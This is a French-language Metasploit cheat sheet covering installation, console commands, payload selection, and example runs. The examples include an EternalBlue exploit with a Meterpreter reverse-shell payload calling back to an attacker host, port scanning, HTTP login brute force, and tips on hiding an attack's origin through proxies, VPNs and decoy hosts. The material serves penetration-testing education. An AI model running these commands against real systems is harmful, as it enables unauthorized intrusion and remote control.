# Metasploit

#### Introduction

Metasploit est un framework open-source pour le développement et l'exécution d'exploits contre des systèmes distants. Il est conçu pour aider les professionnels de la sécurité à identifier et à exploiter les vulnérabilités dans les systèmes informatiques.

#### Installation de Metasploit

**Sous Linux (Debian/Ubuntu)**

```bash
sudo apt update
sudo apt install metasploit-framework
```

#### Démarrage de Metasploit

1.  **Lancer Metasploit Console**

    ```bash
    msfconsole
    ```

    * **Explication** : Lance la console interactive de Metasploit où tu peux exécuter des commandes, rechercher des exploits, et gérer des sessions.

#### Commandes Principales de Metasploit

1.  **Recherche d'exploits**

    ```bash
    search <mot-clé>
    ```

    * **Explication** : Recherche des modules, des exploits, et des payloads correspondant au mot-clé spécifié.
2.  **Affichage des informations sur un exploit**

    ```bash
    info <nom_du_module>
    ```

    * **Explication** : Affiche les informations détaillées sur un module spécifique, y compris les options, les cibles, et les descriptions.


3.  **Sélectionner un exploit**

    ```bash
    use <nom_du_module>
    ```

    * **Explication** : Sélectionne un module d'exploit pour l'utiliser dans Metasploit.


4.  **Configurer les options de l'exploit**

    ```bash
    set <option> <valeur>
    ```

    * **Explication** : Configure les options nécessaires pour l'exploit, comme l'adresse IP cible et les paramètres spécifiques.


5.  **Afficher les options disponibles**

    ```bash
    show options
    ```

    * **Explication** : Affiche les options configurables pour le module actuel.


6.  **Lancer l'exploit**

    ```bash
    exploit
    ```

    * **Explication** : Lance l'exploit avec les options configurées. Peut essayer de pénétrer un système cible en exploitant une vulnérabilité.


7.  **Afficher les sessions ouvertes**

    ```bash
    sessions
    ```

    * **Explication** : Liste toutes les sessions ouvertes avec les systèmes compromis.


8.  **Interagir avec une session**

    ```bash
    sessions -i <id_de_session>
    ```

    * **Explication** : Permet d'interagir avec une session active pour contrôler le système compromis.



#### Modules et Payloads

1.  **Rechercher des modules**

    ```bash
    search <type:exploit> <mot-clé>
    ```

    * **Explication** : Recherche des exploits ou des modules spécifiques en fonction du type et du mot-clé.


2.  **Rechercher des payloads**

    ```bash
    search <type:payload> <mot-clé>
    ```

    * **Explication** : Recherche des payloads disponibles correspondant au mot-clé spécifié.


3.  **Configurer un payload**

    ```bash
    set PAYLOAD <nom_du_payload>
    ```

    * **Explication** : Configure le payload à utiliser avec l'exploit sélectionné.


4.  **Afficher les payloads disponibles**

    ```bash
    show payloads
    ```

    * **Explication** : Affiche une liste des payloads disponibles pour le module d'exploit actuel.



#### Options Avancées

1.  **Utilisation de Metasploit avec des proxys**

    ```bash
    setg Proxies http://<proxy_address>:<port>
    ```

    * **Explication** : Configure Metasploit pour utiliser un proxy HTTP, ce qui peut aider à masquer l'origine des attaques.


2.  **Utilisation de VPN pour masquer l'origine**

    * **Explication** : En utilisant Metasploit via un VPN, tu peux masquer l'origine de ton activité.


3.  **Utilisation de decoy hosts**

    * **Explication** : Lorsque tu réalises des scans, utiliser des hôtes leurres pour masquer l'origine réelle.



#### Exemples de Scénarios

1.  **Exploitation d’une vulnérabilité connue**

    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS 192.168.1.10
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST 192.168.1.5
    exploit
    ```

    * **Explication** : Utilise l'exploit EternalBlue pour exploiter une vulnérabilité SMB sur une machine Windows, avec un payload Meterpreter pour la connexion inverse.


2.  **Scan de port et identification du système d’exploitation**

    ```bash
    use auxiliary/scanner/portscan/tcp
    set RHOSTS 192.168.1.10
    run
    ```

    * **Explication** : Utilise un module de scan de ports pour identifier les ports ouverts sur une cible.


3.  **Utilisation de Metasploit pour une attaque par force brute**

    ```bash
    use auxiliary/scanner/http/http_login
    set RHOSTS 192.168.1.10
    set TARGETURI /login
    set USER_FILE /path/to/usernames.txt
    set PASS_FILE /path/to/passwords.txt
    run
    ```

    * **Explication** : Utilise un module de force brute pour tester des combinaisons de noms d’utilisateur et mots de passe sur une interface de connexion HTTP.

